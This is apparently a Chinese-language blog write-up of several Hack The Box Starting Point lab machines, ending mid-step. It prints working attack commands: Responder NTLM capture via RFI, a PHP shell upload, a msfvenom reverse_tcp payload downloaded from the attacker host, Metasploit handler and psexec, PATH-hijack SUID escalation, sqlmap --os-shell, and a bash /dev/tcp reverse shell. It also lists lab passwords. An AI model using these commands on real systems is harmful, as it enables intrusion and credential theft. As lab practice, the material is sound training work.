+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001942-nhuask9.png" alt="image"></p>
+<p>这里就能看到了</p>
+<p><code>page</code></p>
+<p>‍</p>
+<blockquote>
+<p>Which of the following values for the <code>page</code> parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “&#x2F;&#x2F;10.10.14.6&#x2F;somefile”, “..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”, “minikatz.exe”</p>
+<p>以下哪个 <code>page</code> 参数值会利用本地文件包含 (LFI) 漏洞？”french.html”, “&#x2F;&#x2F;10.10.14.6&#x2F;somefile”, “..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”, “minikatz.exe”</p>
+</blockquote>
+<p><code>../../../../../../../../windows/system32/drivers/etc/hosts</code></p>
+<p>‍</p>
+<blockquote>
+<p>Which of the following values for the <code>page</code> parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “&#x2F;&#x2F;10.10.14.6&#x2F;somefile”, “..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”, “minikatz.exe”</p>
+<p>以下哪个 <code>page</code> 参数值会利用远程文件包含 (RFI) 漏洞？<br>“french.html”,<br> “&#x2F;&#x2F;10.10.14.6&#x2F;somefile”,<br>“..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”, “minikatz.exe”</p>
+</blockquote>
+<p><code>//10.10.14.6/somefile</code></p>
+<p>‍</p>
+<blockquote>
+<p>What does NTLM stand for?<br>NTLM 代表什么？</p>
+</blockquote>
+<p><code>New Technology LAN Manager</code></p>
+<p>‍</p>
+<blockquote>
+<p>Which flag do we use in the Responder utility to specify the network interface?</p>
+<p>在 Responder 工具中，我们应该使用哪个标志来指定网络接口？</p>
+</blockquote>
+<p><code>-I</code></p>
+<p>‍</p>
+<blockquote>
+<p>There are several tools that take a NetNTLMv2 challenge&#x2F;response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as <code>john</code>, but the full name is what?.</p>
+<p>有一些工具会接收 NetNTLMv2 质询&#x2F;响应，并尝试数百万个密码，以查看是否有任何密码会生成相同的响应。其中一款工具通常被称为“john”，但它的全名是什么？</p>
+</blockquote>
+<p><code>John the Ripper</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the password for the administrator user?</p>
+<p>管理员用户的密码是什么？</p>
+</blockquote>
+<p>这题跨度好大，差评（</p>
+<p>先用 <code>responder</code> 监听本地的网卡</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">sudo responder -I tun0</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001945-8p9ivtk.png" alt="image"></p>
+<p>然后在这个网页远程加载我本地的文件</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">http:&#x2F;&#x2F;unika.htb&#x2F;index.php?page&#x3D;&#x2F;&#x2F;10.10.16.28&#x2F;somefile</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251107214238-geyfdtc.png" alt="image"></p>
+<p>然后这边工具就会读到 <code>Administrator</code> 的哈希了</p>
+<ul>
+<li>这里 ai 给的解释是，<code>responder</code> 伪装成了 smb 服务器，当接收远程包含文件时就会通过这个 smb 连接，利用这个连接向服务器发送 ntlm 质询获取 ntlm</li>
+</ul>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001947-psnjvcv.png" alt="image"></p>
+<p>把这个保存下来破解</p>
+<p><code>badminton</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001948-etet68k.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</p>
+<p>我们将使用 Windows 服务（即在目标主机上运行的服务）通过我们找回的密码远程访问响应服务器。它监听的是哪个 TCP 端口？</p>
+</blockquote>
+<p>这里运行的服务是 <code>WS-Management</code>​ 协议服务，用来远程管理和监控，开放了这个端口就证明了 <code>winRM</code> 服务在运行，远程用户就可以进行管理</p>
+<p><code>5985</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001950-iu6lhfi.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>Submit root flag</p>
+</blockquote>
+<p>拿找到的用户密码根据这个服务连接上目标机器</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">evil-winrm -i 10.129.193.57 -u Administrator -p badminton</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001952-u6mdhx8.png" alt="image"></p>
+<p>最后在这里找到 flag</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001953-l8uifh3.png" alt="image"></p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h2><blockquote>
+<p>How many TCP ports are open?</p>
+<p>有多少个 TCP 端口处于开放状态？</p>
+</blockquote>
+<p><code>2</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001955-vg9pz9r.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What is the domain of the email address provided in the “Contact” section of the website?</p>
+<p>网站“联系我们”部分提供的电子邮件地址的域名是什么？</p>
+</blockquote>
+<p><code>thetoppers.htb</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001958-o2o9uov.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?</p>
+<p>在没有 DNS 服务器的情况下，我们可以使用哪个 Linux 文件将主机名解析为 IP 地址，以便能够访问指向这些主机名的网站？</p>
+</blockquote>
+<p>前面有一题我就需要这样搞（</p>
+<p><code>/etc/hosts</code></p>
+<p>‍</p>
+<blockquote>
+<p>Which sub-domain is discovered during further enumeration?</p>
+<p>在进一步枚举过程中发现了哪个子域？</p>
+</blockquote>
+<p>这里可以使用 <code>gobuster</code> 工具来爆破</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">gobuster vhost -w wordlist&#x2F;subdomainDicts&#x2F;dic1.txt -u http:&#x2F;&#x2F;thetoppers.htb</code></pre>
+
+<ul>
+<li><code>vhost</code>​：使用虚拟主机爆破模式，这里能爆破是利用了 <code>host</code>​ 请求头，如果服务器针对某一个 <code>host</code> 返回了不同的内容或状态码，那就认为发现了一个主机</li>
+<li><code>-w</code>：指定要用的字典</li>
+</ul>
+<p>但是这里我跑不出来，很明确字典里是有这个域名的，后面感觉这题就是有问题，这里我后面访问的时候需要加到 <code>/etc/hosts</code> 中才能发访问，那这里我又没加，感觉扫不到就是这个问题</p>
+<p><code>s3.thetoppers.htb</code></p>
+<p>‍</p>
+<blockquote>
+<p>Which service is running on the discovered sub-domain?</p>
+<p>已发现的子域上运行着哪项服务？</p>
+</blockquote>
+<p>这里 curl 一下发现，丢给 ai</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002006-ftd6vqp.png" alt="image"></p>
+<p>是一个亚马逊的云服务 <code>Amazon S3</code></p>
+<p>‍</p>
+<blockquote>
+<p>Which command line utility can be used to interact with the service running on the discovered sub-domain?</p>
+<p>可以使用哪个命令行实用程序与在已发现的子域上运行的服务进行交互？</p>
+</blockquote>
+<p><code>awscli</code></p>
+<p>‍</p>
+<blockquote>
+<p>Which command is used to set up the AWS CLI installation?</p>
+<p>用于设置 AWS CLI 安装的命令是什么？</p>
+</blockquote>
+<p><code>aws configure</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the command used by the above utility to list all of the S3 buckets?</p>
+<p>上述工具用来列出所有 S3 存储桶的命令是什么？</p>
+</blockquote>
+<p><code>aws s3 ls</code></p>
+<p>‍</p>
+<blockquote>
+<p>This server is configured to run files written in what web scripting language?</p>
+<p>此服务器配置为运行用哪种 Web 脚本语言编写的文件？</p>
+</blockquote>
+<p>先配置，随便输入什么都行</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">aws configure</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002008-dxl9bmg.png" alt="image"></p>
+<p>然后列出他的存储桶</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">aws s3 ls --endpoint-url http:&#x2F;&#x2F;s3.thetoppers.htb</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002257-xo3yvsw.png" alt="image"></p>
+<p>最后查看文件</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">aws s3 ls s3:&#x2F;&#x2F;thetoppers.htb --endpoint-url http:&#x2F;&#x2F;s3.thetoppers.htb</code></pre>
+
+<p><code>php</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002010-9jye587.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>Submit root flag</p>
+</blockquote>
+<p>这里需要上传一个 shell 来做</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">aws s3 cp .&#x2F;shell.php s3:&#x2F;&#x2F;thetoppers.htb&#x2F;shell.php --endpoint-url http:&#x2F;&#x2F;s3.thetoppers.htb</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002012-no9wpx6.png" alt="image"></p>
+<p>上传成功了，然后就可以直接执行命令了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002014-b0wtig1.png" alt="image"></p>
+<p>‍</p>
+<h2 id="Archetype"><a href="#Archetype" class="headerlink" title="Archetype"></a>Archetype</h2><blockquote>
+<p>Which TCP port is hosting a database server?</p>
+<p>数据库服务器运行在哪个 TCP 端口上？</p>
+</blockquote>
+<p><code>1433</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002015-cyhlj57.png" alt="image"></p>
+<p>‍</p>
+<p>‍</p>
+<blockquote>
+<p>What is the name of the non-Administrative share available over SMB?</p>
+<p>可通过 SMB 获取的非管理共享名称是什么？</p>
+</blockquote>
+<p>还是先看共享</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">smbclient -L &#x2F;&#x2F;10.129.217.136</code></pre>
+
+<p><code>backups</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002017-bb77vlv.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What is the password identified in the file on the SMB share?</p>
+<p>SMB 共享文件中标识的密码是什么？</p>
+</blockquote>
+<p><code>M3g4c0rp123</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002019-jyb4n5u.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?</p>
+<p>Impacket 集合中的哪个脚本可以用来建立与 Microsoft SQL Server 的身份验证连接？</p>
+</blockquote>
+<p>这里 Impacket 是一个 kali 中的工具库</p>
+<p><code>mssqlclient.py</code></p>
+<p>‍</p>
+<blockquote>
+<p>What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?</p>
+<p>Microsoft SQL Server 的哪个扩展存储过程可以用来启动 Windows 命令 shell？</p>
+</blockquote>
+<p>这里在配置的时候一直有问题（</p>
+<p>然后发现是路径问题，然后就拿前面的用户名密码登录就行</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">mssqlclient.py sql_svc:M3g4c0rp123@10.129.217.136 -windows-auth</code></pre>
+
+<ul>
+<li><code>-windows-auth</code>：指定使用 windows 认证，不使用这个登不进去</li>
+</ul>
+<p>这里的答案就是 <code>xp_cmdshell</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002021-iayut0u.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What script can be used in order to search possible paths to escalate privileges on Windows hosts?</p>
+<p>可以使用什么脚本来搜索在 Windows 主机上提升权限的可能路径？</p>
+</blockquote>
+<p><code>winpeas</code></p>
+<p>‍</p>
+<blockquote>
+<p>What file contains the administrator’s password?</p>
+<p>管理员密码位于哪个文件？</p>
+</blockquote>
+<p>上面确实使用 <code>xp_cmdshell</code> 可以执行命令，但是难受，这里学着反弹 shell </p>
+<p>先利用 <code>msfvenom</code> 创建一个恶意文件，这个工具是用来生成 payload 的独立命令行工具</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;10.10.16.28 lport&#x3D;4444 -f exe -o shell.exe</code></pre>
+
+<ul>
+<li><p><code>-p</code>：指定使用的 payload 种类</p>
+<p><code>windows/meterpreter/reverse_tcp</code>​：<br>​<code>windows</code>​ 目标操作系统<br>​<code>meterpreter</code>​ 成功后要使用的交互式 shell 类型，后面成功打上去显示的就是这个<br>​<code>reverse_tcp</code> payload 的连接方式，让目标机主动连接回来到我的机器</p>
+</li>
+<li><p><code>lhost  lport</code>：指定攻击者的 ip 和端口</p>
+</li>
+<li><p><code>-f</code>：指定输出格式，这里一开始没指定导致一直用不了（</p>
+</li>
+<li><p><code>-o</code>：指出输出 payload 的文件名</p>
+</li>
+</ul>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002024-m1hlxk7.png" alt="image"></p>
+<p>然后在本地开一个服务</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002025-5pidl5i.png" alt="image"></p>
+<p>在远程下载</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">xp_cmdshell &quot;powershell cd C:\Users\sql_svc\Downloads;wget http:&#x2F;&#x2F;10.10.16.28:8000&#x2F;shell.exe -outfile shell.exe&quot;</code></pre>
+
+<p>成功下载下来</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002027-smgmnw9.png" alt="image"></p>
+<p>然后启动 <code>msfconsole</code> 这个是 msf 的主命令行工具，这个应该我之后会写个笔记记录</p>
+<p>命令</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">use exploit&#x2F;multi&#x2F;handler     # 选择加载模块，这个是建立了一个通用的监听器，用来接收反弹 shell 
+set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp  #告诉监听器要接受哪种类型的 payload 回连
+set lhost 10.10.16.28		  # 设置本地 ip
+set lport 4444				  # 设置端口
+exploit						  # 启动监听器</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002029-5jg6vhy.png" alt="image"></p>
+<p>这里上面提示要用 <code>winpeas</code>，那就上传一个上去</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">upload winPEASx86.exe C:\\Users\\sql_svc\\Downloads\\winPEASx86.exe</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002031-5wfsmyg.png" alt="image"></p>
+<p>在这里输入 shell 就可以打开 cmd 了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002033-3wq1ds0.png" alt="image"></p>
+<p>然后运行这个 <code>winpeas</code> ，翻看结果的时候可以看到一个东西，有点像历史命令</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002034-1seorja.png" alt="image"></p>
+<p>这里就可以看到密码了，这题的答案也就是这个了</p>
+<p><code>ConsoleHost_history.txt</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002037-ltby7qo.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>Submit user flag</p>
+</blockquote>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002049-vaba4tj.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>Submit root flag</p>
+</blockquote>
+<p>前面不是拿到了管理员的账号密码，这里就要连接上去，要利用到 <code>psexec</code> 模块</p>
+<ul>
+<li><p><code>psexec</code> 是一个可以在其他远程系统上执行进程的软件，主要是利用 SMB 和 SCM（windows 的服务控制管理器） 来实现远程命令执行，要使用这个，必须要有管理员账户的凭证</p>
+<p>工作流程：</p>
+<ol>
+<li>使用提供的用户名和密码通过 SMB 445 端口连接到目标</li>
+<li>连接成功后，通过 <code>ADMIN$</code> 共享将一个 payload 传到目标系统上</li>
+<li>模块向 SCM 远程发送请求，远程创建并启动一个服务，这个服务的命令路径指向上传的 payload 文件</li>
+<li>服务启动后就会以服务用户的权限运行</li>
+<li>payload 指向发现连接到攻击者的 IP</li>
+</ol>
+</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec		# 加载 psexec 模块
+set RHOSTS 10.129.217.136			# 配置目标 ip 地址
+set SMBUser administrator			# 配置用户名
+set SMBPass MEGACORP_4dm1n!!		# 配置密码
+set PAYLOAD windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp # 指定 payload 种类
+set LHOST 10.10.16.28				# 设置本地 ip
+set LPORT 6666						# 设置端口
+exploit								# 尝试连接</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002051-0rn62dl.png" alt="image"></p>
+<p>这里可能要多跑几次，我第一次跑超时了，但是第二次就行了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002052-fag08f6.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002054-3fqpd6x.png" alt="image"></p>
+<p>‍</p>
+<h2 id="Oopsie"><a href="#Oopsie" class="headerlink" title="Oopsie"></a>Oopsie</h2><blockquote>
+<p>With what kind of tool can intercept web traffic?</p>
+<p>可以使用什么工具拦截网络流量？</p>
+</blockquote>
+<p><code>proxy</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the path to the directory on the webserver that returns a login page?</p>
+<p>Web 服务器上返回登录页面的目录路径是什么？</p>
+</blockquote>
+<p><code>/cdn-cgi/login</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002056-lzgnhyb.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What can be modified in Firefox to get access to the upload page?</p>
+<p>如何在 Firefox 中进行修改才能访问上传页面？</p>
+</blockquote>
+<p><code>cookie</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the access ID of the admin user?</p>
+<p>管理员用户的访问 ID 是什么？</p>
+</blockquote>
+<p>访问登录页面，这里有一个游客登录</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002058-l3655t3.png" alt="image"></p>
+<p>可以发现有一个参数 id ，尝试修改一下</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002100-dz4smoi.png" alt="image"></p>
+<p><code>34322</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002101-c5ephg0.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>On uploading a file, what directory does that file appear in on the server?</p>
+<p>上传文件后，该文件出现在服务器上的哪个目录中？</p>
+</blockquote>
+<p>提示要爆破目录，直接上 dirsearch，应该是这个（</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002103-nlhfcxm.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What is the file that contains the password that is shared with the robert user?</p>
+<p>与 robert 用户共享的包含密码的文件是什么？</p>
+</blockquote>
+<p>这里应该是和文件上传有关的，捣鼓了半天怎么改 cookie（</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002107-7jc4u0b.png" alt="image"></p>
+<p>传一个最简单的 shell 就可以用了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002108-5x6t443.png" alt="image"></p>
+<p>这里其实就是了</p>
+<p><code>db.php</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002110-keypmez.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What executible is run with the option “-group bugtracker” to identify all files owned by the bugtracker group?</p>
+<p>使用“-group bugtracker”选项运行哪个可执行文件，以识别 bugtracker 组拥有的所有文件？</p>
+</blockquote>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">find &#x2F; -group bugtracker 2&gt;&#x2F;dev&#x2F;null</code></pre>
+
+<p><code>find</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002112-mjn9vgo.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>Regardless of which user starts running the bugtracker executable, what’s user privileges will use to run?</p>
+<p>无论哪个用户启动 bugtracker 可执行文件，运行该程序将使用什么用户权限？</p>
+</blockquote>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002114-cv4jodq.png" alt="image"></p>
+<p><code>root</code></p>
+<p>‍</p>
+<blockquote>
+<p>What SUID stands for?</p>
+<p>SUID 是什么的缩写？</p>
+</blockquote>
+<p><code>Set owner User ID</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the name of the executable being called in an insecure manner?</p>
+<p>以不安全方式调用的可执行文件的名称是什么？</p>
+</blockquote>
+<p>这里运行前面的那个程序，这里就可以看到命令</p>
+<p><code>cat</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002116-s8p40z5.png" alt="image"></p>
+<p>‍</p>
+<h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>这里有 ssh 端口开放，那就拿之前的密码直接开连</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002118-t1z7qg7.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002120-wgbbgzd.png" alt="image"></p>
+<p>然后根据访问找到的 <code>/usr/bin/bugtracker</code>​ 我们可以知道这个是 <code>root</code> 权限的，利用这个来进行 suid 提权</p>
+<p>这里的原理是利用这个程序可能调用 cat 命令没有使用绝对路径，我们修改环境变量，让这个程序找到我们的恶意的 cat 文件</p>
+<ol>
+<li><p>创建恶意脚本</p>
+<p>这里也是一个 cat 文件，但是指向的是一个 bash 命令</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">echo &#39;&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;tmp&#x2F;cat</code></pre></li>
+<li><p>赋予权限</p>
+<p>给这个脚本一个执行权限</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">chmod +x &#x2F;tmp&#x2F;cat</code></pre></li>
+<li><p>劫持 PATH 环境变量</p>
+<p>将 <code>/tmp</code>​ 目录添加到当前 shell 的 PATH 的环境变量的最前面，告诉系统，当找可执行文件是，去 <code>/tmp</code> 目录下找</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">export PATH&#x3D;&#x2F;tmp:$PATH</code></pre></li>
+<li><p>执行 suid 文件</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">&#x2F;usr&#x2F;bin&#x2F;bugtracker</code></pre></li>
+</ol>
+<p>这里注意在使用最后执行命令的时候不能用 cat ，因为 cat 已经被我们修改了（</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002122-bx66pg2.png" alt="image"></p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="Vaccine"><a href="#Vaccine" class="headerlink" title="Vaccine"></a>Vaccine</h2><blockquote>
+<p>Besides SSH and HTTP, what other service is hosted on this box?</p>
+<p>除了 SSH 和 HTTP 之外，这台服务器上还托管了哪些其他服务？</p>
+</blockquote>
+<p><code>ftp</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002124-r96dick.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>This service can be configured to allow login with any password for specific username. What is that username?</p>
+<p>此服务可以配置为允许使用任意密码登录特定用户名。请问该用户名是什么？</p>
+</blockquote>
+<p><code>anonymous</code></p>
+<p>‍</p>
+<p>‍</p>
+<blockquote>
+<p>What is the name of the file downloaded over this service?</p>
+<p>通过此服务下载的文件的名称是什么？</p>
+</blockquote>
+<p><code>backup.zip</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002126-w3thr4i.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?</p>
+<p>John The Ripper 工具集中包含哪个脚本，能够从受密码保护的 zip 压缩包中生成哈希值，并且生成格式允许进行破解尝试？</p>
+</blockquote>
+<p><code>zip2john</code></p>
+<p>几乎是秒破（</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002127-6bh3f1t.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What is the password for the admin user on the website?</p>
+<p>网站管理员用户的密码是什么？</p>
+</blockquote>
+<p>压缩包中有一个 index.php 打开能看到一个密码的 md5</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002129-ne89wj3.png" alt="image"></p>
+<p>找个网站爆一下</p>
+<p><code>qwerty789</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002131-t1cgjuf.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What option can be passed to sqlmap to try to get command execution via the sql injection?</p>
+<p>可以通过传递什么选项给 sqlmap 来尝试通过 SQL 注入获取命令执行权限？</p>
+</blockquote>
+<p><code>--os-shell</code></p>
+<p>这里登录进去有个搜索的位置可以进行 sql 注入，在这里手注有点麻烦（，上 sqlmap 了，这里的报错丢给 ai ，这好像是一个 <code>PostgreSQL</code> </p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002133-sp1oa2l.png" alt="image"></p>
+<p>而且好像我还真没学过怎么获取 sql 的命令权限orz</p>
+<p>使用 sqlmap 拿到权限了</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">sqlmap -u &quot;http:&#x2F;&#x2F;10.129.190.192&#x2F;dashboard.php?search&#x3D;?id&#x3D;-1&quot; -p search --dbms&#x3D;postgres --batch --cookie&#x3D;&quot;PHPSESSID&#x3D;ld2fq6h3ense9597h4kktfdi6t&quot; --os-shell</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002134-rthycl8.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What program can the postgres user run as root using sudo?</p>
+<p>postgres 用户可以使用 sudo 以 root 用户身份运行什么程序？</p>
+</blockquote>
+<p>这里要运行这个需要 ssh 连接上登陆，这里用 sqlmap 的不太行，而且用着很难受</p>
+<p>而且这里有个很神秘的问题，就是我读不到这个文件，明明其他文件都能读到的</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002137-308lay5.png" alt="image"></p>
+<p>这里用这个命令反弹 shell 出来，另一个反弹不了，这个才行</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">&#x2F;bin&#x2F;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.28&#x2F;4444 0&gt;&amp;1&quot;</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002138-58k23jx.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002139-6ezd0kz.png" alt="image"></p>
+<p>然后成功在这个文件中读到这个用户的密码</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002142-c1c3lc6.png" alt="image"></p>
+<p>上去之后就可以看到用那些命令可以用</p>
+<p><code>vi</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002144-k7ocqln.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>flag</p>
+</blockquote>
+<p>这里我们在上面可以看到用 sudo 的 vi 可以操作这个文件</p>
+<p>这里有一个提权的方法，先用这个命令进到 vi 可以修改文件的地方</p>
